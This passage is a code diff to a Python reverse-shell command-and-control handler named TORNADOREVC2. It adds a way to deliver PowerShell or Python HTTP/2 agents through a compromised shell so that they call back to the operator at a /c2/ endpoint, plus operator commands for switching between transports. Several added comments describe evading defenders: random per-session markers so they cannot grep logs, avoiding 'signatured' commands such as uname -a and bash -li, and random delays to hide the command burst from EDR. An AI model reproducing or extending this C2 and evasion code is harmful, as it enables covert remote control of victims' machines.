+                "command -v pip3 >/dev/null && echo PIP3 || echo NOPIP"
+            )
+            self.send_to_revshell(sock, check)
+            out = self.recv_output(sock, timeout=3.0)
+            if 'PY3' not in out:
+                return None, 'python3 not found on target'
+            if 'PIP3' not in out:
+                return 'h2', 'python3 present, pip3 absent (h2 must already be installed)'
+            return 'h2', 'python3 and pip3 present'
+
+        # Windows: query the PowerShell major version.
+        ps = (
+            "Write-Output ('H1V'+$PSVersionTable.PSVersion.Major+'VEND')"
+        )
+        self._flush_shell(sock, timeout=0.3)
+        self._send_win_ps(sock, ps)
+        out = self.recv_output(sock, timeout=5.0)
+        m = re.search(r'H1V(\d+)VEND', out)
+        if not m:
+            return None, 'could not determine PowerShell version'
+        major = int(m.group(1))
+        if major >= 7:
+            return 'h2', f'PowerShell {major}'
+        return 'h1', f'PowerShell {major} (HTTP/2 requires PS 7+)'
+
+    def _http1_payload(self, url):
+        return _HTTP1_AGENT_PS.replace('__H1_URL__', url)
+
+    def http2_switch(self, client_id, handler_host=None):
+        """Spawn an HTTP-based secondary transport and flip the active one."""
+        info = self._get_info_by_id(client_id)
+        if info is None:
+            print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
+            return False
+
+        if not self.h2_port:
+            print(
+                f"{self.colors['red']}HTTP listener is not running — "
+                f"start the handler with --h2-port{self.colors['end']}"
+            )
+            return False
+
+        if info['transports'].get('http2') is not None:
+            print(
+                f"{self.colors['yellow']}HTTP transport already active on "
+                f"#{client_id} — no action{self.colors['end']}"
+            )
+            return False
+
+        if handler_host:
+            # User gave either an IP or an interface name.
+            resolved = self._resolve_bind_ip(handler_host)
+            if resolved is None:
+                print(
+                    f"{self.colors['red']}[H2] Could not resolve bind target "
+                    f"'{handler_host}' to an IPv4 address{self.colors['end']}"
+                )
+                return False
+            handler_host = resolved
+        else:
+            # Auto-detect: ask the kernel which interface would reach the
+            # target, then fall back to the session's local endpoint, then
+            # to the listener host.
+            target_ip = None
+            try:
+                target_ip = info['addr'][0]
+            except Exception:
+                pass
+            if target_ip:
+                handler_host = self._pick_default_outbound_ip(target_ip)
+            if not handler_host:
+                try:
+                    handler_host = info['sock'].getsockname()[0]
+                except Exception:
+                    handler_host = None
+            if not handler_host or handler_host in ('0.0.0.0', '::'):
+                handler_host = self.host if self.host not in ('0.0.0.0', '::') else '127.0.0.1'
+
+        if not handler_host:
+            print(
+                f"{self.colors['red']}[H2] Could not determine a reachable "
+                f"handler IP; pass --rh <ip|iface>{self.colors['end']}"
+            )
+            return False
+
+        mode, detail = self._h2_preflight(info)
+        if mode is None:
+            print(
+                f"{self.colors['red']}[H2] Target unsuitable for HTTP transport: "
+                f"{detail}{self.colors['end']}"
+            )
+            return False
+
+        print(
+            f"{self.colors['cyan']}[H2] Pre-flight: {detail} → using {mode}"
+            f"{self.colors['end']}"
+        )
+
+        token = secrets.token_hex(8)
+        with self.client_lock:
+            self._h2_pending[token] = info['sock']
+
+        primary_sock = info['sock']
+        shell_kind   = (info.get('type') or 'unknown').lower()
+
+        if shell_kind == 'windows' and mode == 'h2':
+            url = f"https://{handler_host}:{self.h2_port}/c2/{token}"
+            ps  = self._http2_payload(url)
+            print(
+                f"{self.colors['cyan']}[H2] Spawning HTTP/2 agent on #{client_id} "
+                f"(Windows PS 7+, callback {url}){self.colors['end']}"
+            )
+            sent = self._send_win_ps(primary_sock, ps)
+
+        elif shell_kind == 'windows' and mode == 'h1':
+            url = f"https://{handler_host}:{self.h2_port}/c2/{token}"
+            ps  = self._http1_payload(url)
+            print(
+                f"{self.colors['cyan']}[H2] Spawning HTTP/1.1 agent on #{client_id} "
+                f"(Windows PS 5, callback {url}){self.colors['end']}"
+            )
+            sent = self._send_win_ps(primary_sock, ps)
+
+        else:
+            print(
+                f"{self.colors['cyan']}[H2] Spawning HTTP/2 agent on #{client_id} "
+                f"(Unix, callback https://{handler_host}:{self.h2_port}/c2/{token})"
+                f"{self.colors['end']}"
+            )
+            sent = self._deliver_http2_linux(
+                primary_sock, handler_host, self.h2_port, token,
+            )
+
+        if not sent:
+            print(
+                f"{self.colors['red']}[H2] Failed to deliver HTTP agent"
+                f"{self.colors['end']}"
+            )
+            with self.client_lock:
+                self._h2_pending.pop(token, None)
+            return False
+
+        wait_s   = 45.0 if shell_kind != 'windows' else 25.0
+        deadline = time.time() + wait_s
+        while time.time() < deadline:
+            if info['transports'].get('http2') is not None:
+                return True
+            time.sleep(0.25)
+
+        print(
+            f"{self.colors['yellow']}[H2] No stream within {int(wait_s)}s — "
+            f"check target outbound access to {handler_host}:{self.h2_port}"
+            f"{self.colors['end']}"
+        )
+        with self.client_lock:
+            self._h2_pending.pop(token, None)
+        return False
+
+    def http2_backtoshell(self, client_id):
+        """Terminate the HTTP/2 agent and revert to the primary shell."""
+        info = self._get_info_by_id(client_id)
+        if info is None:
+            print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
+            return False
+
+        h2 = info['transports'].get('http2')
+        if h2 is None:
+            print(
+                f"{self.colors['yellow']}No HTTP/2 transport active on "
+                f"#{client_id}{self.colors['end']}"
+            )
+            return False
+
+        # Send an exit hint through the HTTP/2 stream. On Windows the child
+        # cmd.exe exits on `exit`; on Linux the Python agent terminates its
+        # shell and closes the socket, which fires StreamEnded on our side.
+        try:
+            h2.sendall(b"exit\n")
+        except Exception:
+            pass
+        time.sleep(0.5)
+
+        # Force-close from this side too.
+        try:
+            h2.close()
+        except Exception:
+            pass
+        with self.client_lock:
+            self.revshell_clients.pop(h2, None)
+        info['transports']['http2'] = None
+        info['active_transport']    = 'shell'
+
+        display = info['name'] if info.get('name') else f"#{client_id}"
+        print(
+            f"{self.colors['green']}[H2] HTTP/2 transport closed on "
+            f"{display} — reverted to shell{self.colors['end']}"
+        )
+        logger = info.get('logger')
+        if logger:
+            logger.log_event("HTTP/2 transport closed; reverted to shell")
+        return True
+
+    def _get_primary_sock_by_id(self, client_id):
+        """Return the primary (shell) socket for a logical session."""
         with self.client_lock:
             for sock, info in self.revshell_clients.items():
-                if info['id'] == client_id and sock.fileno() != -1:
+                if info['id'] == client_id and info.get('sock') is sock:
                     return sock
         return None
+
+    def _get_info_by_id(self, client_id):
+        with self.client_lock:
+            seen = set()
+            for _sock, info in self.revshell_clients.items():
+                if info['id'] == client_id and id(info) not in seen:
+                    seen.add(id(info))
+                    return info
+        return None
+
+    def _active_sock_for_info(self, info):
+        """
+        Return the current live transport for a session info dict.
+
+        Preference order:
+        1. The transport marked active_transport, if its fileno is valid.
+        2. The other transport, if it's still alive.
+        3. The primary shell socket as a last resort.
+        """
+        if info is None:
+            return None
+        with self.client_lock:
+            active     = info.get('active_transport', 'shell')
+            transports = dict(info.get('transports') or {})
+
+        candidates = []
+        primary = transports.get(active)
+        if primary is not None:
+            candidates.append(primary)
+        for key in ('shell', 'http2'):
+            t = transports.get(key)
+            if t is not None and t not in candidates:
+                candidates.append(t)
+        if info.get('sock') and info['sock'] not in candidates:
+            candidates.append(info['sock'])
+
+        for t in candidates:
+            try:
+                if t.fileno() != -1:
+                    return t
+            except Exception:
+                continue
+        return None
+
+    def transport_status(self, client_id):
+        """Print the current transport state for a session."""
+        info = self._get_info_by_id(client_id)
+        if info is None:
+            print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
+            return
+
+        c = self.colors
+        active = info.get('active_transport', 'shell')
+        shell  = (info.get('transports') or {}).get('shell')
+        h2     = (info.get('transports') or {}).get('http2')
+
+        def _state(sock):
+            if sock is None:
+                return f"{c['yellow']}not attached{c['end']}"
+            try:
+                return (f"{c['green']}alive{c['end']} "
+                        f"(fileno={sock.fileno()}, peer={sock.getpeername()})")
+            except Exception:
+                return f"{c['red']}dead{c['end']}"
+
+        print(f"{c['cyan']}Transport state for #{client_id}:{c['end']}")
+        print(f"  active       : {c['bold']}{active}{c['end']}")
+        print(f"  shell        : {_state(shell)}")
+        print(f"  http2        : {_state(h2)}")
+        print(f"  last active  : {info.get('last_send_via', '(none yet)')}")
+        print(f"  last addr    : {info.get('last_send_addr', '(none)')}")
 
     def _remote_file_size(self, client_sock, remote_path, shell_type):
         if shell_type == 'unknown':
@@ -966,38 +2201,48 @@ class TORNADOREVC2:
             print(f"{self.colors['red']}No Active Clients{self.colors['end']}")
         else:
             print(f"{self.colors['green']}Active Clients:{self.colors['end']}")
+        seen = set()
         with self.client_lock:
             for sock, info in self.revshell_clients.items():
-                if sock.fileno() != -1:
-                    status = "CURRENT" if sock == self.current_client else ""
+                if sock.fileno() == -1:
+                    continue
+                sid = info.get('id')
+                if sid in seen:
+                    continue
+                seen.add(sid)
 
-                    if info.get('mtls'):
-                        proto = "MTLS"
-                    elif info.get('tls'):
-                        proto = "TLS"
-                    else:
-                        proto = "TCP"
+                status = "CURRENT" if sock == self.current_client else ""
 
-                    direction = "BIND" if info.get('direction') == 'bind' else "REV"
-                    proto = f"{proto}/{direction}"
+                if info.get('mtls'):
+                    proto = "MTLS"
+                elif info.get('tls'):
+                    proto = "TLS"
+                else:
+                    proto = "TCP"
 
-                    display = f"#{info['id']} ({info['name']})" if info.get("name") else f"#{info['id']}"
-                    sysinfo = info.get('sysinfo') or {}
-                    host = sysinfo.get('hostname', '?')
-                    user = sysinfo.get('username', '?')
-                    os_name = sysinfo.get('os', info.get('type', '?'))
-                    arch = sysinfo.get('architecture', '')
-                    reconnects = info.get('connect_count', 1)
-                    detail = f"{user}@{host} [{os_name}"
-                    if arch:
-                        detail += f"/{arch}"
-                    detail += "]"
-                    if reconnects > 1:
-                        detail += f" (reconnects: {reconnects})"
-                    log_dir = info.get('logger').session_dir if info.get('logger') else ''
-                    print(f"  {display} {info['addr'][0]}:{info['addr'][1]} {proto} {detail} {status}")
-                    if log_dir:
-                        print(f"    {self.colors['blue']}Log: {log_dir}{self.colors['end']}")
+                direction = "BIND" if info.get('direction') == 'bind' else "REV"
+                proto = f"{proto}/{direction}"
+                act = info.get('active_transport', 'shell')
+                if act == 'http2':
+                    proto = f"{proto} [active: http2]"
+
+                display = f"#{info['id']} ({info['name']})" if info.get("name") else f"#{info['id']}"
+                sysinfo = info.get('sysinfo') or {}
+                host = sysinfo.get('hostname', '?')
+                user = sysinfo.get('username', '?')
+                os_name = sysinfo.get('os', info.get('type', '?'))
+                arch = sysinfo.get('architecture', '')
+                reconnects = info.get('connect_count', 1)
+                detail = f"{user}@{host} [{os_name}"
+                if arch:
+                    detail += f"/{arch}"
+                detail += "]"
+                if reconnects > 1:
+                    detail += f" (reconnects: {reconnects})"
+                log_dir = info.get('logger').session_dir if info.get('logger') else ''
+                print(f"  {display} {info['addr'][0]}:{info['addr'][1]} {proto} {detail} {status}")
+                if log_dir:
+                    print(f"    {self.colors['blue']}Log: {log_dir}{self.colors['end']}")
 
     def _live_session_ids(self):
         ids = set()
@@ -1190,8 +2435,16 @@ class TORNADOREVC2:
         self._set_completer_mode('client')
         sys.stdout.flush()
 
+        # Capture `info` in the closure instead of the socket, so every
+        # send resolves through whichever transport is currently active.
+        def _send_via_active(cmd):
+            live = self._active_sock_for_info(info)
+            if live is None:
+                return False
+            return self.send_to_revshell(live, cmd)
+
         term = TerminalManager(
-            send_fn=lambda cmd: self.send_to_revshell(client_sock, cmd),
+            send_fn=_send_via_active,
             shell_type=shell_type,
             pty_active=info.get('pty', False),
         )
@@ -1199,7 +2452,20 @@ class TORNADOREVC2:
         last_interrupt = 0.0
 
         def prompt_text():
-            host_info = self.get_host_info(client_sock)
+            # Build the prompt from the session info dict, not the captured
+            # socket, so a transport switch or a primary-shell death does
+            # not leave the prompt showing "disconnected".
+            sysinfo  = info.get('sysinfo') or {}
+            hostname = sysinfo.get('hostname', '?')
+            username = sysinfo.get('username', '?')
+            if info.get('name'):
+                display = info['name']
+            elif username != '?' and hostname != '?':
+                display = f"{username}@{hostname}"
+            else:
+                display = f"#{info.get('id', '?')}"
+            addr = info.get('addr') or ('?', 0)
+            host_info = f"{display}@{addr[0]}:{addr[1]}"
             return (
                 f"\r{self.colors['green']}{host_info}{self.colors['end']} "
                 f"{self.colors['cyan']}{shell_type}>{self.colors['end']} "
@@ -1214,16 +2480,25 @@ class TORNADOREVC2:
                         break
                     if not cmd:
                         continue
+
+                    # Re-resolve the active transport on every command so
+                    # http2switch / backtoshell take effect immediately.
+                    live = self._active_sock_for_info(info)
+                    if live is None:
+                        print(f"{self.colors['red']}No live transport for this session"
+                              f"{self.colors['end']}")
+                        continue
+
                     cmd_parts = cmd.split()
                     cmd_lower = cmd_parts[0].lower()
 
                     if cmd_lower == 'sysinfo':
                         _, mode = self._parse_sysinfo_args(cmd_parts, from_client=True)
-                        self.show_sysinfo(client_sock, refresh=True, mode=mode)
+                        self.show_sysinfo(live, refresh=True, mode=mode)
                         continue
 
                     if cmd_lower in ('socks', 'tunnels'):
-                        if self.tunnels.handle_command(client_sock, cmd_parts, from_client=True):
+                        if self.tunnels.handle_command(live, cmd_parts, from_client=True):
                             continue
 
                     if cmd_lower == 'upload':
@@ -1231,7 +2506,7 @@ class TORNADOREVC2:
                         t_args = t_opts['args']
                         if len(t_args) >= 2:
                             self.upload_file(
-                                client_sock, t_args[0], t_args[1],
+                                live, t_args[0], t_args[1],
                                 resume=t_opts['resume'],
                                 use_https=t_opts['https'],
                                 https_bind=t_opts['https_bind'],
@@ -1250,7 +2525,7 @@ class TORNADOREVC2:
                         t_args = t_opts['args']
                         if len(t_args) >= 2:
                             self.download_file(
-                                client_sock, t_args[0], t_args[1],
+                                live, t_args[0], t_args[1],
                                 resume=t_opts['resume'],
                                 use_https_push=t_opts['https_push'],
                                 https_bind=t_opts['https_bind'],
@@ -1265,25 +2540,51 @@ class TORNADOREVC2:
                         continue
 
                     if cmd_lower in ('verify', 'hash') and len(cmd_parts) >= 2:
-                        self.verify_file(client_sock, cmd_parts[1])
+                        self.verify_file(live, cmd_parts[1])
                         continue
 
                     if cmd_lower == 'export':
-                        if self.exporter.handle_command(cmd_parts, client_sock=client_sock):
+                        if self.exporter.handle_command(cmd_parts, client_sock=live):
                             continue
 
                     if cmd_lower in ('run', 'plugins'):
-                        if self.plugins.handle_command(cmd_parts, client_sock=client_sock):
+                        if self.plugins.handle_command(cmd_parts, client_sock=live):
                             continue
                     if cmd_lower == 'bof':
                         try:
                             from .plugins.windows.bofloader import dispatch_bof_command
-                            dispatch_bof_command(self, cmd_parts, client_sock=client_sock)
+                            dispatch_bof_command(self, cmd_parts, client_sock=live)
                         except ImportError:
                             print(f"{self.colors['red']}bofloader plugin is not loaded — "
                                   f"'bof' unavailable{self.colors['end']}")
                         except Exception as e:
                             print(f"{self.colors['red']}BOF dispatch error: {e}{self.colors['end']}")
+                        continue
+
+                    if cmd_lower == 'http2switch':
+                        if info is None:
+                            print(f"{self.colors['red']}Session gone{self.colors['end']}")
+                            continue
+                        rh = None
+                        if '--rh' in cmd_parts:
+                            idx = cmd_parts.index('--rh')
+                            if idx + 1 < len(cmd_parts):
+                                rh = cmd_parts[idx + 1]
+                        self.http2_switch(info['id'], handler_host=rh)
+                        continue
+
+                    if cmd_lower == 'backtoshell':
+                        if info is None:
+                            print(f"{self.colors['red']}Session gone{self.colors['end']}")
+                            continue
+                        self.http2_backtoshell(info['id'])
+                        continue
+
+                    if cmd_lower == 'transport':
+                        if info is None:
+                            print(f"{self.colors['red']}Session gone{self.colors['end']}")
+                            continue
+                        self.transport_status(info['id'])
                         continue
 
                     if cmd_lower == 'help':
@@ -1312,6 +2613,11 @@ class TORNADOREVC2:
     run <plugin> [args...]                            Execute a plugin on this session
     bof <name> [args...]          Run a registered BOF from inside a session
 
+    {self.colors['green']}TRANSPORT SWITCHING:{self.colors['end']}
+    http2switch [--rh <ip|iface>]                     Switch this session to the HTTP/2 channel
+    backtoshell                                       Close HTTP/2 and go back to the shell
+    transport                                         Show which channel is active
+
     {self.colors['green']}FILE TRANSFER:{self.colors['end']}
     upload [--resume] <local> <remote>                Chunked upload with SHA256 verify
     upload --https [iface] [-RH host[:port]] <local> <remote>  HTTPS upload
@@ -1321,8 +2627,8 @@ class TORNADOREVC2:
                         continue
 
                     print(f"\r{self.colors['yellow']}$ {cmd}{self.colors['end']}", end='', flush=True)
-                    if self.send_to_revshell(client_sock, cmd):
-                        output = self.recv_output(client_sock)
+                    if self.send_to_revshell(live, cmd):
+                        output = self.recv_output(live)
                         print(f"\r{output}")
                         if logger:
                             logger.log_command(cmd, output)
@@ -1335,7 +2641,12 @@ class TORNADOREVC2:
                         break
                     last_interrupt = now
                     term.send_interrupt()
-                    self.recv_output(client_sock, timeout=0.5)
+                    try:
+                        _live = self._active_sock_for_info(info)
+                        if _live is not None:
+                            self.recv_output(_live, timeout=0.5)
+                    except Exception:
+                        pass
                     print(f"\n{self.colors['yellow']}^C sent to remote (Ctrl+C again to exit){self.colors['end']}")
                 except EOFError:
                     break
@@ -1460,6 +2771,42 @@ class TORNADOREVC2:
                               f"'bof' unavailable{self.colors['end']}")
                     except Exception as e:
                         print(f"{self.colors['red']}BOF dispatch error: {e}{self.colors['end']}")
+                elif cmd_lower == 'http2switch':
+                    if len(cmd_parts) < 2:
+                        print(f"{self.colors['red']}Usage: http2switch <ID> "
+                              f"[--rh <handler-ip|iface>]{self.colors['end']}")
+                        continue
+                    try:
+                        sid = int(cmd_parts[1])
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                        continue
+                    rh = None
+                    if '--rh' in cmd_parts:
+                        idx = cmd_parts.index('--rh')
+                        if idx + 1 < len(cmd_parts):
+                            rh = cmd_parts[idx + 1]
+                    self.http2_switch(sid, handler_host=rh)
+                elif cmd_lower == 'backtoshell':
+                    if len(cmd_parts) < 2:
+                        print(f"{self.colors['red']}Usage: backtoshell <ID>{self.colors['end']}")
+                        continue
+                    try:
+                        sid = int(cmd_parts[1])
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                        continue
+                    self.http2_backtoshell(sid)
+                elif cmd_lower == 'transport':
+                    if len(cmd_parts) < 2:
+                        print(f"{self.colors['red']}Usage: transport <ID>{self.colors['end']}")
+                        continue
+                    try:
+                        sid = int(cmd_parts[1])
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                        continue
+                    self.transport_status(sid)
                 elif cmd_lower == 'upload':
                     t_opts = self._parse_transfer_args(cmd_parts)
                     t_args = t_opts['args']
@@ -1549,6 +2896,11 @@ class TORNADOREVC2:
     run <plugin> <ID>                                        Execute a plugin on a session
     bof <ID> <name> [args...]     Run a registered BOF from a session
 
+    {self.colors['green']}TRANSPORT SWITCHING:{self.colors['end']}
+    http2switch <ID> [--rh <ip|iface>]                       Switch session to the HTTP/2 channel
+    backtoshell <ID>                                         Close HTTP/2 and go back to the shell
+    transport <ID>                                           Show which channel is active
+
     {self.colors['green']}INTERNAL PIVOTING (SOCKS5):{self.colors['end']}
     socks <ID> <listen_port>                                 Start SOCKS5 proxy via session
     socks <ID> test <host> <port>                            Test internal TCP reachability
@@ -1572,16 +2924,70 @@ class TORNADOREVC2:
                 print(f"\n{self.colors['yellow']}For exiting please type exit(e) or quit(q){self.colors['end']}")
 
     def cleanup_client(self, client_sock):
-        info = None
         with self.client_lock:
             info = self.revshell_clients.pop(client_sock, None)
         if not info:
             return
+
+        primary = info.get('sock')
+
+        # Case 1: this is a *secondary* transport being torn down.
+        # Remove it from transports and revert to the primary if it was active.
+        if client_sock is not primary:
+            for k, v in list((info.get('transports') or {}).items()):
+                if v is client_sock:
+                    info['transports'][k] = None
+            try:
+                client_sock.close()
+            except Exception:
+                pass
+            if info.get('active_transport') != 'shell' and \
+               info['transports'].get(info['active_transport']) is None:
+                info['active_transport'] = 'shell'
+                reason = info.pop('_last_h2_close_reason', None)
+                if reason is None:
+                    import traceback as _tb
+                    reason = 'unknown'
+                    print(
+                        f"{self.colors['red']}[transport] closing bridge "
+                        f"with no reason set. Stack:{self.colors['end']}"
+                    )
+                    for line in _tb.format_stack():
+                        print(f"  {line.rstrip()}")
+                print(
+                    f"{self.colors['yellow']}Secondary transport on "
+                    f"#{info['id']} closed — reverted to shell "
+                    f"(reason: {reason})"
+                    f"{self.colors['end']}"
+                )
+            return
+
+        # Case 2: primary shell died. If HTTP/2 is still up, promote it.
+        h2 = (info.get('transports') or {}).get('http2')
+        h2_alive = False
+        if h2 is not None:
+            try:
+                h2_alive = h2.fileno() != -1
+            except Exception:
+                h2_alive = False
+
         self.tunnels.cleanup_session(client_sock)
         try:
             client_sock.close()
         except Exception:
             pass
+
+        if h2_alive:
+            info['active_transport'] = 'http2'
+            with self.client_lock:
+                self.revshell_clients[h2] = info
+            print(
+                f"{self.colors['yellow']}Primary shell closed on "
+                f"#{info['id']} — HTTP/2 transport still active"
+                f"{self.colors['end']}"
+            )
+            return
+
         display = info["name"] if info.get("name") else f"#{info['id']}"
         logger = info.get('logger')
         if logger:
@@ -1608,6 +3014,11 @@ class TORNADOREVC2:
         self._close_listener(self._tcp_server)
         self._close_listener(self._tls_server)
         self._close_listener(self._mtls_server)
+        if self._h2_listener is not None:
+            try:
+                self._h2_listener.stop()
+            except Exception:
+                pass
         self.tunnels.shutdown_for_restart()
         with self.client_lock:
             clients = list(self.revshell_clients.keys())
@@ -1642,22 +3053,58 @@ class TORNADOREVC2:
             'fingerprint': None,
             'connect_count': 1,
             'reconnected': False,
+            # Secondary-transport bookkeeping.
+            'transports': {'shell': client_sock, 'http2': None},
+            'active_transport': 'shell',
+            'h2_token': None,
         }
         with self.client_lock:
             self.revshell_clients[client_sock] = client_info
 
-        self.send_to_revshell(
-            client_sock,
-            "uname -a 2>/dev/null; echo __T_PROBE__; ver 2>&1; cmd /c ver 2>&1; echo __T_PROBE_END__",
+        # Session-scoped probe markers. Never emit a fixed string that a
+        # defender could grep for in shell command logs or EDR process
+        # telemetry. `make_probe_markers` derives them from
+        # secrets.token_hex, so no two sessions share them.
+        start_mark, end_mark = make_probe_markers()
+        client_info['probe_markers'] = (start_mark, end_mark)
+
+        # Single, less-signatured Unix probe. Prefer /etc/os-release over
+        # `uname -a` — the latter is the classic red-team fingerprint.
+        # No redirects — cmd.exe chokes on `2>/dev/null` because /dev/
+        # doesn't exist on Windows.
+        unix_probe = (
+            f"cat /etc/os-release | head -3; "
+            f"echo {start_mark}; "
+            f"uname -srm || uname -a; "
+            f"echo {end_mark}"
         )
-        probe_output = self.recv_output(client_sock, timeout=4.0, until_marker='__T_PROBE_END__')
+        self.send_to_revshell(client_sock, unix_probe)
+        probe_output = self.recv_output(
+            client_sock, timeout=4.0, until_marker=end_mark,
+        )
+
+        # If the Unix probe returned nothing usable (cmd.exe), send a
+        # single Windows `ver` command. One fallback, not three at once.
+        if start_mark not in probe_output:
+            time.sleep(random.uniform(0.3, 0.9))
+            win_probe = f"echo {start_mark} & ver & echo {end_mark}"
+            self.send_to_revshell(client_sock, win_probe)
+            probe_output += self.recv_output(
+                client_sock, timeout=4.0, until_marker=end_mark,
+            )
         inferred = self.infer_platform(probe_output)
         if inferred == 'unknown' and probe_windows_platform(self, client_sock):
             inferred = 'windows'
         client_info['type'] = inferred
+
+        # Break up the connect-time command burst. Without this, an EDR
+        # sees 4-6 process spawns within a few seconds of the inbound
+        # connection — exactly the pattern automated tooling produces.
+        time.sleep(random.uniform(0.4, 1.4))
         if inferred == 'windows':
             from .win_client import detect_windows_shell_kind
             client_info['win_shell'] = detect_windows_shell_kind(self, client_sock)
+            time.sleep(random.uniform(0.3, 1.0))
         client_info['identity'] = self._probe_identity(client_sock, inferred)
 
         term = TerminalManager(
@@ -1668,18 +3115,25 @@ class TORNADOREVC2:
             self.send_to_revshell(client_sock, term.unix_pty_upgrade_cmd())
             time.sleep(1.5)
             self._flush_shell(client_sock, timeout=1.0)
+
+            # Session-scoped markers for the PTY verification probe.
+            pty_start, pty_end = make_probe_markers()
             probe = (
-                "__TN_SH__; "
+                f"echo {pty_start}; "
                 "if [ -n \"$BASH_VERSION\" ]; then echo BASH_OK; "
                 "else echo BASH_NO; fi; "
-                "echo __TN_SHEnd__"
+                f"echo {pty_end}"
             )
             self.send_to_revshell(client_sock, probe)
             out = self.recv_output(
-                client_sock, timeout=4.0, until_marker='__TN_SHEnd__'
+                client_sock, timeout=4.0, until_marker=pty_end,
             )
             if 'BASH_NO' in out:
-                self.send_to_revshell(client_sock, "exec /bin/bash -li 2>/dev/null")
+                # Avoid `exec bash -li`: the `-li` combination (login +
+                # interactive) is heavily signatured and legitimate
+                # automation almost never uses it. A bare exec inherits
+                # the active PTY.
+                self.send_to_revshell(client_sock, "exec /bin/bash -i 2>/dev/null")
                 time.sleep(0.8)
                 self._flush_shell(client_sock, timeout=0.8)
             client_info['pty'] = True
@@ -1896,6 +3350,22 @@ class TORNADOREVC2:
         self._tcp_server = tcp_server
         self._tls_server = tls_server
         self._mtls_server = mtls_server
+
+        if self.h2_port:
+            h2 = Http2Listener(self, self.host, self.h2_port,
+                               self.certfile, self.keyfile)
+            if h2.start():
+                self._h2_listener = h2
+                print(
+                    f"{self.colors['green']}[H2] HTTP/2 secondary listener on "
+                    f"{self.host}:{self.h2_port}{self.colors['end']}"
+                )
+            else:
+                print(
+                    f"{self.colors['yellow']}[H2] listener did not start "
+                    f"(pip install h2){self.colors['end']}"
+                )
+
         self.running = True
 
         threading.Thread(target=self.listener, args=(tcp_server, False), daemon=True).start()
@@ -1927,6 +3397,8 @@ def main():
     parser.add_argument('-p', '--port', type=int, default=4444, help='TCP listener port')
     parser.add_argument('-tp', '--tls-port', type=int, default=8443, help='TLS listener port')
     parser.add_argument('-mp', '--mtls-port', type=int, default=9443, help='mTLS listener port')
+    parser.add_argument('--h2-port', type=int, default=None,
+                        help='HTTP/2 secondary listener port (e.g. 443). Omit to disable.')
     parser.add_argument('-c', '--cert', default=os.path.join('tls_certs', 'server.pem'), help='TLS certificate file')
     parser.add_argument('-k', '--key', default=os.path.join('tls_certs', 'server.key'), help='TLS private key file')
     parser.add_argument('--mtls-ca-cert', default=os.path.join('mtls_certs', 'ca.pem'))
@@ -1942,6 +3414,7 @@ def main():
         revshell_port=args.port,
         tls_port=args.tls_port,
         mtls_port=args.mtls_port,
+        h2_port=args.h2_port,
         certfile=args.cert,
         keyfile=args.key,
         mtls_ca_cert=args.mtls_ca_cert,
